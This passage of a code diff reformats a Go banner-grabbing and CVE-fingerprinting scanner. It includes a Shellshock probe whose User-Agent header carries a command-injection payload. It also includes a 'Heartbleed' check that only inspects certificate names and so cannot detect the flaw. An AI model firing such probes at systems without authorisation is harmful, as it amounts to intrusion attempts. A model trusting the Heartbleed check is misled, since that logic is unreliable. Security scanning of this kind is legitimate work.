@@ -1,18 +1,18 @@
 /*
 
-__________                                      ________                                        
-\______   \_____    ____   ____   ___________  /  _____/___________  ______        ____   ____  
- |    |  _/\__  \  /    \ /    \_/ __ \_  __ \/   \  __\_  __ \__  \ \____ \      / ___\ /  _ \ 
+__________                                      ________
+\______   \_____    ____   ____   ___________  /  _____/___________  ______        ____   ____
+ |    |  _/\__  \  /    \ /    \_/ __ \_  __ \/   \  __\_  __ \__  \ \____ \      / ___\ /  _ \
  |    |   \ / __ \|   |  \   |  \  ___/|  | \/\    \_\  \  | \// __ \|  |_> >    / /_/  >  <_> )
- |______  /(____  /___|  /___|  /\___  >__|    \______  /__|  (____  /   __/ /\  \___  / \____/ 
-        \/      \/     \/     \/     \/               \/           \/|__|    \/ /_____/         
+ |______  /(____  /___|  /___|  /\___  >__|    \______  /__|  (____  /   __/ /\  \___  / \____/
+        \/      \/     \/     \/     \/               \/           \/|__|    \/ /_____/
                                                                       Version 2.0
 
     Copyright 2025 MrEchoFi_Ebwer
-	
+
 	MIT License
 
-	
+
 
 Copyright (c) 2025 MrEchoFi_Md. Abu Naser Nayeem [Tanjib Isham]
 
@@ -36,11 +36,11 @@ SOFTWARE.
 
 */
 
-
 package main
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"crypto/tls"
 	"encoding/csv"
@@ -52,16 +52,16 @@ import (
 	"net"
 	"net/http"
 	"os"
-	"bytes"
+
 	//"path/filepath"
+	"regexp"
 	"strings"
 	"sync"
 	"time"
-	"regexp"
 
+	"golang.org/x/crypto/ssh"
 	"golang.org/x/net/http2"
 	"nhooyr.io/websocket"
-	"golang.org/x/crypto/ssh"
 )
 
 // This will hold the result and will check in advanced mode
@@ -83,7 +83,7 @@ type BannerResult struct {
 	Report      string   `json:"report,omitempty"`
 }
 
-//protocol and payloads..
+// protocol and payloads..
 var protocolPayloads = map[string]string{
 	"http":      "GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
 	"https":     "GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
@@ -91,703 +91,677 @@ var protocolPayloads = map[string]string{
 	"ftp":       "USER anonymous\r\n",
 	"ssh":       "",
 	"telnet":    "",
-	"http2":     "", 
-	"websocket": "", 
+	"http2":     "",
+	"websocket": "",
 }
 
-
 func checkVulnerabilities(host, port, protocol, banner string) []string {
-    var vulns []string
+	var vulns []string
 
-   
-    if protocol == "http" {
-        if strings.Contains(banner, "Apache/2.4.49") {
-            vulns = append(vulns, "Apache 2.4.49 RCE (CVE-2021-41773)")
-        }
-        if strings.Contains(banner, "Apache/2.4.50") {
-            vulns = append(vulns, "Apache 2.4.50 Path Traversal (CVE-2021-42013)")
-        }
-        if strings.Contains(banner, "nginx/1.16.1") {
-            vulns = append(vulns, "Nginx 1.16.1 - Multiple CVEs (CVE-2019-20372, CVE-2019-20373)")
-        }
-        if strings.Contains(banner, "nginx/1.18.0") {
-            vulns = append(vulns, "Nginx 1.18.0 - Potential vulnerabilities (check CVE database)")
-        }
-        if strings.Contains(banner, "LiteSpeed") {
-            vulns = append(vulns, "LiteSpeed detected - Check for CVE-2019-11043 and others")
-        }
-        if strings.Contains(banner, "Microsoft-IIS/7.5") {
-            vulns = append(vulns, "IIS 7.5 - Multiple vulnerabilities (CVE-2015-1635, CVE-2017-7269)")
-        }
-        if strings.Contains(banner, "Microsoft-IIS/8.5") {
-            vulns = append(vulns, "IIS 8.5 - Check for CVE-2017-7269 and others")
-        }
-        if strings.Contains(banner, "Apache-Coyote/1.1") {
-            vulns = append(vulns, "Tomcat (Apache-Coyote/1.1) - Ghostcat (CVE-2020-1938) and others")
-        }
-        if strings.Contains(banner, "Apache Tomcat/9.0.0") {
-            vulns = append(vulns, "Tomcat 9.0.0 - Multiple vulnerabilities (check CVE database)")
-        }
-        if strings.Contains(banner, "Jetty(9.4.18.v20190429)") {
-            vulns = append(vulns, "Jetty 9.4.18 - CVE-2019-10241, CVE-2019-10247")
-        }
-        if strings.Contains(banner, "GWS") {
-            vulns = append(vulns, "Google Web Server detected - check for known issues")
-        }
-        if strings.Contains(banner, "Tengine") {
-            vulns = append(vulns, "Tengine (Alibaba Nginx fork) detected - check for CVEs")
-        }
-        if strings.Contains(banner, "OpenResty") {
-            vulns = append(vulns, "OpenResty detected - check for Nginx-based CVEs")
-        }
-        if strings.Contains(banner, "Cherokee") {
-            vulns = append(vulns, "Cherokee Web Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Caddy") {
-            vulns = append(vulns, "Caddy Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Resin") {
-            vulns = append(vulns, "Resin Application Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Oracle-Application-Server") {
-            vulns = append(vulns, "Oracle Application Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "IBM_HTTP_Server") {
-            vulns = append(vulns, "IBM HTTP Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Zeus") {
-            vulns = append(vulns, "Zeus Web Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "AkamaiGHost") {
-            vulns = append(vulns, "AkamaiGHost detected - check for CDN vulnerabilities")
-        }
-        if strings.Contains(banner, "Yaws") {
-            vulns = append(vulns, "Yaws (Erlang Web Server) detected - check for CVEs")
-        }
-        if strings.Contains(banner, "TwistedWeb") {
-            vulns = append(vulns, "TwistedWeb detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Gunicorn") {
-            vulns = append(vulns, "Gunicorn (Python WSGI) detected - check for CVEs")
-        }
-        if strings.Contains(banner, "uWSGI") {
-            vulns = append(vulns, "uWSGI detected - check for CVEs")
-        }
-        if strings.Contains(banner, "mod_wsgi") {
-            vulns = append(vulns, "mod_wsgi detected - check for CVEs")
-        }
-        if strings.Contains(banner, "mod_python") {
-            vulns = append(vulns, "mod_python detected - check for CVEs")
-        }
-        if strings.Contains(banner, "mod_perl") {
-            vulns = append(vulns, "mod_perl detected - check for CVEs")
-        }
-        if strings.Contains(banner, "WEBrick") {
-            vulns = append(vulns, "WEBrick (Ruby) detected - check for CVEs")
-        }
-        if strings.Contains(banner, "GlassFish") {
-            vulns = append(vulns, "GlassFish Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Sun-Java-System-Web-Server") {
-            vulns = append(vulns, "Sun Java System Web Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Boa/") {
-            vulns = append(vulns, "Boa Web Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "thttpd") {
-            vulns = append(vulns, "thttpd detected - check for CVEs")
-        }
-        if strings.Contains(banner, "lighttpd") {
-            vulns = append(vulns, "lighttpd detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Abyss") {
-            vulns = append(vulns, "Abyss Web Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Zope") {
-            vulns = append(vulns, "Zope Application Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Hiawatha") {
-            vulns = append(vulns, "Hiawatha Web Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "RomPager") {
-            vulns = append(vulns, "RomPager detected - check for CVE-2014-9222 (Misfortune Cookie)")
-        }
-        if strings.Contains(banner, "BarracudaHTTP") {
-            vulns = append(vulns, "Barracuda HTTP Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "GoAhead-Webs") {
-            vulns = append(vulns, "GoAhead Web Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Mongoose") {
-            vulns = append(vulns, "Mongoose Web Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Monkey/") {
-            vulns = append(vulns, "Monkey HTTP Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Allegro-Software-RomPager") {
-            vulns = append(vulns, "Allegro RomPager detected - check for CVE-2014-9222")
-        }
-        if strings.Contains(banner, "SAP NetWeaver") {
-            vulns = append(vulns, "SAP NetWeaver detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Cisco-WSA") {
-            vulns = append(vulns, "Cisco Web Security Appliance detected - check for CVEs")
-        }
-        if strings.Contains(banner, "BlueCoat") {
-            vulns = append(vulns, "BlueCoat Proxy detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Squid") {
-            vulns = append(vulns, "Squid Proxy detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Varnish") {
-            vulns = append(vulns, "Varnish Cache detected - check for CVEs")
-        }
-        if strings.Contains(banner, "F5 BIG-IP") {
-            vulns = append(vulns, "F5 BIG-IP detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Citrix NetScaler") {
-            vulns = append(vulns, "Citrix NetScaler detected - check for CVEs")
-        }
-        if strings.Contains(banner, "FortiWeb") {
-            vulns = append(vulns, "FortiWeb detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Radware AppDirector") {
-            vulns = append(vulns, "Radware AppDirector detected - check for CVEs")
-        }
-        if strings.Contains(banner, "ArrayNetworks") {
-            vulns = append(vulns, "Array Networks detected - check for CVEs")
-        }
-        if strings.Contains(banner, "A10 Networks") {
-            vulns = append(vulns, "A10 Networks detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Barracuda") {
-            vulns = append(vulns, "Barracuda Networks detected - check for CVEs")
-        }
-    }
+	if protocol == "http" {
+		if strings.Contains(banner, "Apache/2.4.49") {
+			vulns = append(vulns, "Apache 2.4.49 RCE (CVE-2021-41773)")
+		}
+		if strings.Contains(banner, "Apache/2.4.50") {
+			vulns = append(vulns, "Apache 2.4.50 Path Traversal (CVE-2021-42013)")
+		}
+		if strings.Contains(banner, "nginx/1.16.1") {
+			vulns = append(vulns, "Nginx 1.16.1 - Multiple CVEs (CVE-2019-20372, CVE-2019-20373)")
+		}
+		if strings.Contains(banner, "nginx/1.18.0") {
+			vulns = append(vulns, "Nginx 1.18.0 - Potential vulnerabilities (check CVE database)")
+		}
+		if strings.Contains(banner, "LiteSpeed") {
+			vulns = append(vulns, "LiteSpeed detected - Check for CVE-2019-11043 and others")
+		}
+		if strings.Contains(banner, "Microsoft-IIS/7.5") {
+			vulns = append(vulns, "IIS 7.5 - Multiple vulnerabilities (CVE-2015-1635, CVE-2017-7269)")
+		}
+		if strings.Contains(banner, "Microsoft-IIS/8.5") {
+			vulns = append(vulns, "IIS 8.5 - Check for CVE-2017-7269 and others")
+		}
+		if strings.Contains(banner, "Apache-Coyote/1.1") {
+			vulns = append(vulns, "Tomcat (Apache-Coyote/1.1) - Ghostcat (CVE-2020-1938) and others")
+		}
+		if strings.Contains(banner, "Apache Tomcat/9.0.0") {
+			vulns = append(vulns, "Tomcat 9.0.0 - Multiple vulnerabilities (check CVE database)")
+		}
+		if strings.Contains(banner, "Jetty(9.4.18.v20190429)") {
+			vulns = append(vulns, "Jetty 9.4.18 - CVE-2019-10241, CVE-2019-10247")
+		}
+		if strings.Contains(banner, "GWS") {
+			vulns = append(vulns, "Google Web Server detected - check for known issues")
+		}
+		if strings.Contains(banner, "Tengine") {
+			vulns = append(vulns, "Tengine (Alibaba Nginx fork) detected - check for CVEs")
+		}
+		if strings.Contains(banner, "OpenResty") {
+			vulns = append(vulns, "OpenResty detected - check for Nginx-based CVEs")
+		}
+		if strings.Contains(banner, "Cherokee") {
+			vulns = append(vulns, "Cherokee Web Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Caddy") {
+			vulns = append(vulns, "Caddy Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Resin") {
+			vulns = append(vulns, "Resin Application Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Oracle-Application-Server") {
+			vulns = append(vulns, "Oracle Application Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "IBM_HTTP_Server") {
+			vulns = append(vulns, "IBM HTTP Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Zeus") {
+			vulns = append(vulns, "Zeus Web Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "AkamaiGHost") {
+			vulns = append(vulns, "AkamaiGHost detected - check for CDN vulnerabilities")
+		}
+		if strings.Contains(banner, "Yaws") {
+			vulns = append(vulns, "Yaws (Erlang Web Server) detected - check for CVEs")
+		}
+		if strings.Contains(banner, "TwistedWeb") {
+			vulns = append(vulns, "TwistedWeb detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Gunicorn") {
+			vulns = append(vulns, "Gunicorn (Python WSGI) detected - check for CVEs")
+		}
+		if strings.Contains(banner, "uWSGI") {
+			vulns = append(vulns, "uWSGI detected - check for CVEs")
+		}
+		if strings.Contains(banner, "mod_wsgi") {
+			vulns = append(vulns, "mod_wsgi detected - check for CVEs")
+		}
+		if strings.Contains(banner, "mod_python") {
+			vulns = append(vulns, "mod_python detected - check for CVEs")
+		}
+		if strings.Contains(banner, "mod_perl") {
+			vulns = append(vulns, "mod_perl detected - check for CVEs")
+		}
+		if strings.Contains(banner, "WEBrick") {
+			vulns = append(vulns, "WEBrick (Ruby) detected - check for CVEs")
+		}
+		if strings.Contains(banner, "GlassFish") {
+			vulns = append(vulns, "GlassFish Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Sun-Java-System-Web-Server") {
+			vulns = append(vulns, "Sun Java System Web Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Boa/") {
+			vulns = append(vulns, "Boa Web Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "thttpd") {
+			vulns = append(vulns, "thttpd detected - check for CVEs")
+		}
+		if strings.Contains(banner, "lighttpd") {
+			vulns = append(vulns, "lighttpd detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Abyss") {
+			vulns = append(vulns, "Abyss Web Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Zope") {
+			vulns = append(vulns, "Zope Application Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Hiawatha") {
+			vulns = append(vulns, "Hiawatha Web Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "RomPager") {
+			vulns = append(vulns, "RomPager detected - check for CVE-2014-9222 (Misfortune Cookie)")
+		}
+		if strings.Contains(banner, "BarracudaHTTP") {
+			vulns = append(vulns, "Barracuda HTTP Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "GoAhead-Webs") {
+			vulns = append(vulns, "GoAhead Web Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Mongoose") {
+			vulns = append(vulns, "Mongoose Web Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Monkey/") {
+			vulns = append(vulns, "Monkey HTTP Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Allegro-Software-RomPager") {
+			vulns = append(vulns, "Allegro RomPager detected - check for CVE-2014-9222")
+		}
+		if strings.Contains(banner, "SAP NetWeaver") {
+			vulns = append(vulns, "SAP NetWeaver detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Cisco-WSA") {
+			vulns = append(vulns, "Cisco Web Security Appliance detected - check for CVEs")
+		}
+		if strings.Contains(banner, "BlueCoat") {
+			vulns = append(vulns, "BlueCoat Proxy detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Squid") {
+			vulns = append(vulns, "Squid Proxy detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Varnish") {
+			vulns = append(vulns, "Varnish Cache detected - check for CVEs")
+		}
+		if strings.Contains(banner, "F5 BIG-IP") {
+			vulns = append(vulns, "F5 BIG-IP detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Citrix NetScaler") {
+			vulns = append(vulns, "Citrix NetScaler detected - check for CVEs")
+		}
+		if strings.Contains(banner, "FortiWeb") {
+			vulns = append(vulns, "FortiWeb detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Radware AppDirector") {
+			vulns = append(vulns, "Radware AppDirector detected - check for CVEs")
+		}
+		if strings.Contains(banner, "ArrayNetworks") {
+			vulns = append(vulns, "Array Networks detected - check for CVEs")
+		}
+		if strings.Contains(banner, "A10 Networks") {
+			vulns = append(vulns, "A10 Networks detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Barracuda") {
+			vulns = append(vulns, "Barracuda Networks detected - check for CVEs")
+		}
+	}
 
-    
-    if protocol == "https" {
-        if strings.Contains(banner, "OpenSSL 1.0.1") {
-            vulns = append(vulns, "Possible Heartbleed (OpenSSL 1.0.1)")
-        }
-        if strings.Contains(banner, "LibreSSL") {
-            vulns = append(vulns, "LibreSSL detected - check for CVEs")
-        }
-        if strings.Contains(banner, "GnuTLS") {
-            vulns = append(vulns, "GnuTLS detected - check for CVEs")
-        }
-    }
+	if protocol == "https" {
+		if strings.Contains(banner, "OpenSSL 1.0.1") {
+			vulns = append(vulns, "Possible Heartbleed (OpenSSL 1.0.1)")
+		}
+		if strings.Contains(banner, "LibreSSL") {
+			vulns = append(vulns, "LibreSSL detected - check for CVEs")
+		}
+		if strings.Contains(banner, "GnuTLS") {
+			vulns = append(vulns, "GnuTLS detected - check for CVEs")
+		}
+	}
 
-   
-    if strings.Contains(banner, "PHP/5.4") {
-        vulns = append(vulns, "PHP 5.4 - End of Life, multiple vulnerabilities")
-    }
-    if strings.Contains(banner, "PHP/7.2") {
-        vulns = append(vulns, "PHP 7.2 - End of Life, multiple vulnerabilities")
-    }
-    if strings.Contains(banner, "Node.js/10.") {
-        vulns = append(vulns, "Node.js 10.x - End of Life, multiple vulnerabilities")
-    }
-    if strings.Contains(banner, "Express") {
-        vulns = append(vulns, "Express.js detected - check for CVEs")
-    }
-    if strings.Contains(banner, "Django") {
-        vulns = append(vulns, "Django detected - check for CVEs")
-    }
-    if strings.Contains(banner, "Flask") {
-        vulns = append(vulns, "Flask detected - check for CVEs")
-    }
-    if strings.Contains(banner, "Ruby on Rails") {
-        vulns = append(vulns, "Ruby on Rails detected - check for CVEs")
-    }
+	if strings.Contains(banner, "PHP/5.4") {
+		vulns = append(vulns, "PHP 5.4 - End of Life, multiple vulnerabilities")
+	}
+	if strings.Contains(banner, "PHP/7.2") {
+		vulns = append(vulns, "PHP 7.2 - End of Life, multiple vulnerabilities")
+	}
+	if strings.Contains(banner, "Node.js/10.") {
+		vulns = append(vulns, "Node.js 10.x - End of Life, multiple vulnerabilities")
+	}
+	if strings.Contains(banner, "Express") {
+		vulns = append(vulns, "Express.js detected - check for CVEs")
+	}
+	if strings.Contains(banner, "Django") {
+		vulns = append(vulns, "Django detected - check for CVEs")
+	}
+	if strings.Contains(banner, "Flask") {
+		vulns = append(vulns, "Flask detected - check for CVEs")
+	}
+	if strings.Contains(banner, "Ruby on Rails") {
+		vulns = append(vulns, "Ruby on Rails detected - check for CVEs")
+	}
 
-    
-    if protocol == "smtp" {
-        if strings.Contains(banner, "Exim 4.87") {
-            vulns = append(vulns, "Exim 4.87 - RCE (CVE-2016-1531, CVE-2019-10149)")
-        }
-        if strings.Contains(banner, "Postfix") {
-            vulns = append(vulns, "Postfix detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Sendmail") {
-            vulns = append(vulns, "Sendmail detected - check for CVEs")
-        }
-        if strings.Contains(banner, "qmail") {
-            vulns = append(vulns, "qmail detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Microsoft ESMTP MAIL Service") {
-            vulns = append(vulns, "Microsoft Exchange detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Courier") {
-            vulns = append(vulns, "Courier Mail Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Lotus Domino") {
-            vulns = append(vulns, "Lotus Domino Mail Server detected - check for CVEs")
-        }
-    }
+	if protocol == "smtp" {
+		if strings.Contains(banner, "Exim 4.87") {
+			vulns = append(vulns, "Exim 4.87 - RCE (CVE-2016-1531, CVE-2019-10149)")
+		}
+		if strings.Contains(banner, "Postfix") {
+			vulns = append(vulns, "Postfix detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Sendmail") {
+			vulns = append(vulns, "Sendmail detected - check for CVEs")
+		}
+		if strings.Contains(banner, "qmail") {
+			vulns = append(vulns, "qmail detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Microsoft ESMTP MAIL Service") {
+			vulns = append(vulns, "Microsoft Exchange detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Courier") {
+			vulns = append(vulns, "Courier Mail Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Lotus Domino") {
+			vulns = append(vulns, "Lotus Domino Mail Server detected - check for CVEs")
+		}
+	}
 
-    
-    if protocol == "ftp" {
-        if strings.Contains(banner, "ProFTPD 1.3.5") {
-            vulns = append(vulns, "ProFTPD 1.3.5 - Multiple vulnerabilities (CVE-2015-3306)")
-        }
-        if strings.Contains(banner, "vsFTPd 2.3.4") {
-            vulns = append(vulns, "vsFTPd 2.3.4 - Backdoor vulnerability (CVE-2011-2523)")
-        }
-        if strings.Contains(banner, "Pure-FTPd") {
-            vulns = append(vulns, "Pure-FTPd detected - check for CVEs")
-        }
-        if strings.Contains(banner, "FileZilla Server") {
-            vulns = append(vulns, "FileZilla Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Serv-U FTP Server") {
-            vulns = append(vulns, "Serv-U FTP Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "WS_FTP Server") {
-            vulns = append(vulns, "WS_FTP Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Gene6 FTP Server") {
-            vulns = append(vulns, "Gene6 FTP Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Wing FTP Server") {
-            vulns = append(vulns, "Wing FTP Server detected - check for CVEs")
-        }
-    }
+	if protocol == "ftp" {
+		if strings.Contains(banner, "ProFTPD 1.3.5") {
+			vulns = append(vulns, "ProFTPD 1.3.5 - Multiple vulnerabilities (CVE-2015-3306)")
+		}
+		if strings.Contains(banner, "vsFTPd 2.3.4") {
+			vulns = append(vulns, "vsFTPd 2.3.4 - Backdoor vulnerability (CVE-2011-2523)")
+		}
+		if strings.Contains(banner, "Pure-FTPd") {
+			vulns = append(vulns, "Pure-FTPd detected - check for CVEs")
+		}
+		if strings.Contains(banner, "FileZilla Server") {
+			vulns = append(vulns, "FileZilla Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Serv-U FTP Server") {
+			vulns = append(vulns, "Serv-U FTP Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "WS_FTP Server") {
+			vulns = append(vulns, "WS_FTP Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Gene6 FTP Server") {
+			vulns = append(vulns, "Gene6 FTP Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Wing FTP Server") {
+			vulns = append(vulns, "Wing FTP Server detected - check for CVEs")
+		}
+	}
 
-    
-    if protocol == "ssh" {
-        if strings.Contains(banner, "OpenSSH_7.2") {
-            vulns = append(vulns, "OpenSSH 7.2 - Multiple vulnerabilities (CVE-2016-0777, CVE-2016-0778)")
-        }
-        if strings.Contains(banner, "Dropbear") {
-            vulns = append(vulns, "Dropbear SSH detected - check for CVEs")
-        }
-        if strings.Contains(banner, "libssh") {
-            vulns = append(vulns, "libssh detected - check for CVE-2018-10933")
-        }
-        if strings.Contains(banner, "Bitvise") {
-            vulns = append(vulns, "Bitvise SSH Server detected - check for CVEs")
-        }
-        if strings.Contains(banner, "WinSCP") {
-            vulns = append(vulns, "WinSCP SSH detected - check for CVEs")
-        }
-    }
+	if protocol == "ssh" {
+		if strings.Contains(banner, "OpenSSH_7.2") {
+			vulns = append(vulns, "OpenSSH 7.2 - Multiple vulnerabilities (CVE-2016-0777, CVE-2016-0778)")
+		}
+		if strings.Contains(banner, "Dropbear") {
+			vulns = append(vulns, "Dropbear SSH detected - check for CVEs")
+		}
+		if strings.Contains(banner, "libssh") {
+			vulns = append(vulns, "libssh detected - check for CVE-2018-10933")
+		}
+		if strings.Contains(banner, "Bitvise") {
+			vulns = append(vulns, "Bitvise SSH Server detected - check for CVEs")
+		}
+		if strings.Contains(banner, "WinSCP") {
+			vulns = append(vulns, "WinSCP SSH detected - check for CVEs")
+		}
+	}
 
-    
-    if protocol == "telnet" {
-        if strings.Contains(banner, "Microsoft Telnet Service") {
-            vulns = append(vulns, "Microsoft Telnet Service detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Cisco IOS") {
-            vulns = append(vulns, "Cisco IOS Telnet detected - check for CVEs")
-        }
-        if strings.Contains(banner, "Linux telnetd") {
-            vulns = append(vulns, "Linux telnetd detected - check for CVEs")
-        }
-    }
+	if protocol == "telnet" {
+		if strings.Contains(banner, "Microsoft Telnet Service") {
+			vulns = append(vulns, "Microsoft Telnet Service detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Cisco IOS") {
+			vulns = append(vulns, "Cisco IOS Telnet detected - check for CVEs")
+		}
+		if strings.Contains(banner, "Linux telnetd") {
+			vulns = append(vulns, "Linux telnetd detected - check for CVEs")
+		}
+	}
 
-   
-    if strings.Contains(banner, "Squid") {
-        vulns = append(vulns, "Squid Proxy detected - check for CVEs")
-    }
-    if strings.Contains(banner, "Varnish") {
-        vulns = append(vulns, "Varnish Cache detected - check for CVEs")
-    }
-    if strings.Contains(banner, "F5 BIG-IP") {
-        vulns = append(vulns, "F5 BIG-IP detected - check for CVEs")
-    }
-    if strings.Contains(banner, "Citrix NetScaler") {
-        vulns = append(vulns, "Citrix NetScaler detected - check for CVEs")
-    }
-    if strings.Contains(banner, "FortiWeb") {
-        vulns = append(vulns, "FortiWeb detected - check for CVEs")
-    }
-    if strings.Contains(banner, "Radware AppDirector") {
-        vulns = append(vulns, "Radware AppDirector detected - check for CVEs")
-    }
-    if strings.Contains(banner, "ArrayNetworks") {
-        vulns = append(vulns, "Array Networks detected - check for CVEs")
-    }
-    if strings.Contains(banner, "A10 Networks") {
-        vulns = append(vulns, "A10 Networks detected - check for CVEs")
-    }
-    if strings.Contains(banner, "Barracuda") {
-        vulns = append(vulns, "Barracuda Networks detected - check for CVEs")
-    }
+	if strings.Contains(banner, "Squid") {
+		vulns = append(vulns, "Squid Proxy detected - check for CVEs")
+	}
+	if strings.Contains(banner, "Varnish") {
+		vulns = append(vulns, "Varnish Cache detected - check for CVEs")
+	}
+	if strings.Contains(banner, "F5 BIG-IP") {
+		vulns = append(vulns, "F5 BIG-IP detected - check for CVEs")
+	}
+	if strings.Contains(banner, "Citrix NetScaler") {
+		vulns = append(vulns, "Citrix NetScaler detected - check for CVEs")
+	}
+	if strings.Contains(banner, "FortiWeb") {
+		vulns = append(vulns, "FortiWeb detected - check for CVEs")
+	}
+	if strings.Contains(banner, "Radware AppDirector") {
+		vulns = append(vulns, "Radware AppDirector detected - check for CVEs")
+	}
+	if strings.Contains(banner, "ArrayNetworks") {
+		vulns = append(vulns, "Array Networks detected - check for CVEs")
+	}
+	if strings.Contains(banner, "A10 Networks") {
+		vulns = append(vulns, "A10 Networks detected - check for CVEs")
+	}
+	if strings.Contains(banner, "Barracuda") {
+		vulns = append(vulns, "Barracuda Networks detected - check for CVEs")
+	}
 
-    
-
-    
 	if protocol == "https" && probeHeartbleed(host, port) {
-        vulns = append(vulns, "Heartbleed vulnerability detected by active probe!")
-    }
-    if protocol == "http" && probeShellshock(host, port) {
-        vulns = append(vulns, "Shellshock vulnerability detected by active probe!")
-    }
-    if protocol == "http" && probeLog4Shell(host, port) {
-        vulns = append(vulns, "Log4Shell vulnerability detected by active probe!")
-    }
+		vulns = append(vulns, "Heartbleed vulnerability detected by active probe!")
+	}
+	if protocol == "http" && probeShellshock(host, port) {
+		vulns = append(vulns, "Shellshock vulnerability detected by active probe!")
+	}
+	if protocol == "http" && probeLog4Shell(host, port) {
+		vulns = append(vulns, "Log4Shell vulnerability detected by active probe!")
+	}
 
-    // CVE/Exploit DB Integration 
-    cveMatches := matchCVEs(banner)
-    vulns = append(vulns, cveMatches...)
-    
+	// CVE/Exploit DB Integration
+	cveMatches := matchCVEs(banner)
+	vulns = append(vulns, cveMatches...)
 
-    return vulns
+	return vulns
 }
 
 // Active Probes
 func probeHeartbleed(host, port string) bool {
-    
-    address := net.JoinHostPort(host, port)
-    conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 3 * time.Second}, "tcp", address, &tls.Config{
-        InsecureSkipVerify: true,
-        ServerName:         host,
-    })
-    if err != nil {
-        return false
-    }
-    defer conn.Close()
-    for _, cert := range conn.ConnectionState().PeerCertificates {
-        if strings.Contains(cert.Subject.CommonName, "OpenSSL 1.0.1") {
-            return true
-        }
-    }
-   
-    return false
+
+	address := net.JoinHostPort(host, port)
+	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 3 * time.Second}, "tcp", address, &tls.Config{
+		InsecureSkipVerify: true,
+		ServerName:         host,
+	})
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+	for _, cert := range conn.ConnectionState().PeerCertificates {
+		if strings.Contains(cert.Subject.CommonName, "OpenSSL 1.0.1") {
+			return true
+		}
+	}
+
+	return false
 }
 
 func probeShellshock(host, port string) bool {
-   
-    url := fmt.Sprintf("http://%s:%s/cgi-bin/test.sh", host, port)
-    client := &http.Client{Timeout: 3 * time.Second}
-    req, err := http.NewRequest("GET", url, nil)
-    if err != nil {
-        return false
-    }
-    req.Header.Set("User-Agent", "() { :; }; echo; echo SHELLSHOCK_TEST")
-    resp, err := client.Do(req)
-    if err != nil {
-        return false
-    }
-    defer resp.Body.Close()
-    buf := new(bytes.Buffer)
-    buf.ReadFrom(resp.Body)
-    return bytes.Contains(buf.Bytes(), []byte("SHELLSHOCK_TEST"))
+
+	url := fmt.Sprintf("http://%s:%s/cgi-bin/test.sh", host, port)
+	client := &http.Client{Timeout: 3 * time.Second}
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("User-Agent", "() { :; }; echo; echo SHELLSHOCK_TEST")
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+	buf := new(bytes.Buffer)
